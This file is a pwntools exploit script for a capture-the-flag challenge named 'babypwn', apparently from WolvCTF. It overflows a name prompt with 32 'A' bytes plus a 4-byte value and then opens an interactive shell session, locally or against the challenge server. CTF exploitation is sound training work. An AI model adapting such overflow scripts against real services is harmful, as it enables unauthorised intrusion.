#!/usr/bin/env python3
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = './babypwn'
elf = ELF(TARGET)

def attach(r):
    if not REMOTE:
        bkps = []
        cmds = []
        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)
    
    r.sendlineafter(b'What\'s your name?\n', b'A' * 32 + p32(0x41414141))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('babypwn.wolvctf.io', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])
        
    exploit(r)
    exit(0)